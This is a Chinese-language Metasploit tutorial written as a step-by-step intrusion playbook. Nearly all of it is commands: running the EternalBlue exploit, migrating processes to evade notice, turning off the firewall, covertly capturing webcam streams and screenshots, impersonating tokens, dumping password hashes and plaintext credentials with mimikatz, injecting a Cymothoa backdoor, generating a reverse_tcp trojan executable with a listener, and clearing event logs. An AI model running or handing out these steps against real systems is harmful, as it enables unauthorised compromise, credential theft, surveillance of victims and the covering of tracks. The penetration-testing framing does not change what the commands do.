# Metasploit使用

<h2 id="menu">目录</h2>

* ### [Metasploit有什么用?](#1)
* ### [Metasploit的模块](#2)
* ### [如何搜索想要的模块](#3)
* ### [使用模块](#4)
* ### [隐藏自己(进程迁移)](#5)
* ### [merterpreter常用命令](#6)
* ### [信息搜集](#7)
* ### [控制摄像头](#8)
* ### [提权](#9)
* ### [假冒令牌](#10)
* ### [获取主机密码](#11)
* ### [后门](#12)
* ### [生成木马](#13)
* ### [清理日志](#14)
***

> <h2 id="1">Metasploit有什么用</h2>
    Metasploit Framework(MSF)是一个强大渗透测试框架，它具有许多功能，而且使用非常方便，例如 端口扫描，漏洞扫描，漏洞验证，漏洞利用，提权，留后门,.......
    简直不要太强。

> <h2 id="2">Metasploit的模块</h2>
`MSF由多个模块组成`
    auxiliaries(辅助模块)
        //扫描
        //漏洞验证
    exploit(漏洞利用)
    payload(攻击载荷)
    post(后期渗透)
    Encoders(编码免杀)
    注:在msf中还能直接使用许多第三方工具，例如sqlmap,nmap

> <h2 id="3">如何搜索想要的模块</h2>
    search  [<options>] [<keywords>:<value>]
    
    Keywords:
        name:modName //通过名称对模块进行查找
            search name:mysql //查找mysql数据的漏洞
        path:modPath //通过路径查询
            search name:mysql //查询mysql路径下所有mysql的利用模块
        rank:value //指定查询模块的rank值
            search rank:good //只要rank值为good的模块
        type:modType //搜索模块的类型，只能搜exploit,auxiliary,post这三个模块
        
        //还有其他的过滤键，可以直接去发掘

> <h2 id="4">使用模块</h2>
    1.搜索到想用的模块
    2.选择模块路径
        use exploit/windows/smb/ms17_010_eternalblue
    3.查看该模块需要设置的参数
        show options
    4.设置参数
        set 参数 值
            set RHOSTS 192.168.1.1
        unset 参数 值
        setg / unsetg //这两个关键字是用于设置全局参数的，当切换模块时，有些之前设置过的值是要重新设置的，很麻烦，但是设置了全局参数就不用反复设置了
    5.启动
        exploit / run //这两个命令打哪个都行

> <h2 id="5">隐藏自己(进程迁移)</h2>
`当我们成功进入目标系统后，会进入meterpreter，这时目标系统上会有这进程，如果被发现的话，可能会引起警惕，所以要把我们自己的进程绑进系统的其他进程里面，这样就不容易被发现，但是如果绑定的进程被关闭了，那么我们也就down了，所以可以将自己绑进一些一般不会关闭的系统进程,并且你绑定什么进程就是什么权限`

    ps //查看目标系统所有进程
    getpid //可以查看meterpreter的进程pid
    migrate 目标进程PID //绑定进程,绑定完之后可以使用getpid查看绑定是否成功，并且使用ps查看之前的进程是否存在，如果存在kill掉
    kill PID //杀死进程
    
    //自动迁移
    run post/windows/manage/migrate

> <h2 id="6">merterpreter常用命令</h2>
    help //查看帮助信息，也会显示所有命令
    sysinfo //获取一些系统的基本信息
    idletime //查看主机运行了多久
    getuid //查看当前权限
    getsystem //获取系统权限
    shell //进入目标系统的shell，例如cmd或者powershell，如果cmd进去有乱码，就使用chcp 65001
    search //搜索文件或目录
        -f 指定文件名或者后缀
        -d 路径
        * 通配符
        例如我要搜索 C盘下所有.txt文件,search -f *.txt -d C:\\
    download 路径 //下载指定文件到本机
    upload 文件路径 //上传文件到目标系统
    rm 文件 //删除文件

> <h2 id="7">信息收集</h2>
    sysinfo //收集系统信息
    run post/windows/gather/checkvm //检查是不是虚拟机
    run post/windows/manage/kaillav //关闭防火墙
    run post/windows/manage/enable_rdp //开启远程桌面
    run post/windows/gather/enum_logged_on_user //列举当前有多少用户登录了目标机器
    run post/windows/gather/enum_applications //列举目标机器上安装了哪些应用程序

> <h2 id="8">控制摄像头</h2>
    webcam_list //看有没有摄像头
    webcam_snap //拍照
    webcam_stream //直播
### 屏幕截图
    load espia //加载插件
    screengrab/ screenhost //截图，两个命令功能一样

> <h2 id="9">提权</h2>
    首先得查看自己是什么权限,使用 getuid
    进入shell,使用 systeminfo查看系统打了哪些补丁，去寻找一些关于当前系统的漏洞的POC，逐个验证，看看有没有可以利用的漏洞
    根据端口去判断系统有哪些漏洞
    使用windows-exploit-suggester进行扫描对比查看系统漏洞

> <h2 id="10">假冒令牌</h2>
### 原理
    什么是令牌？
        令牌是系统的临时密钥，相当于账号密码，是用来决定是否允许这次请求和判断这次请求属于哪个用户，它允许在不提供密码或者其他凭证的前提下，访问网络和系统资源，而且它持续存在于系统当中，除非系统重启
    令牌的种类
        访问令牌：访问控制操作主题的系统对象
        密保令牌：又叫做认证令牌或者硬件令牌
        会话令牌：交互会话中唯一的身份标识符
    在进行令牌假冒的过程中会用到kerberos协议，可以去百度了解一下
### 实战
    use incognito //加载插件
    list_tokens -u //列出可用的token，列出令牌的数量取决于meterpreter shell的权限
    impersonate_token 令牌 // 假冒令牌，令牌是 主机名\\用户 注意是两个斜杠组成的 

> <h2 id="11">获取主机密码</h2>
    hashdump //这个命令要系统权限，可用用于获取用户的hash值拿到之后可用去md5网站跑一下,http://www.cmd5.com
    
    使用mmiikatz获取密码
        load kiwi //加载插件
        msf //抓取hash
        wdigest //抓取明文密码

> <h2 id="12">后门</h2>
这些都是单独的工具
### Cymothoa后门
`将shell code注入到现有进程，进程一关它也就死了，而且拥有的权限和注入的进程是一致的,这个软件是安装到要注入后门的系统上的，这是下载链接https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/`
cymothoa -S //查看shell code编号
cymothoa -p 注入进程的PID -s shell_code编码 -y 开放的端口
注入成功之后，使用nc去连接
### Persistence 后门

> <h2 id="13">生成木马</h2>
`不要打开msf，使用msfvenom可用生成许多木马，例如exe,php,jsp,asp,apk,等等许多文件木马`
    msfvenom -p 要使用的payload LHOST=攻击者主机 LPORT=攻击者主机端口 -f 文件格式 -o 文件名
    例如我要生成一个exe木马
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.75.1 LPROT=4444 -f exe -o 123.exe
    
    生成好了木马文件之后，打开msf
    use exploit/mulit/handler
    set payload 之前设置的-p后面的参数
    set LHOST 192.168.75.1
    set LPORT 4444
    run //开始监听

> <h2 id="14">清理日志</h2>
    如果之前有创建用户或者是创建了什么程序，请删除掉
    clearev 删除日志
    session -k 删除所有会话
***
[回到顶部](#menu)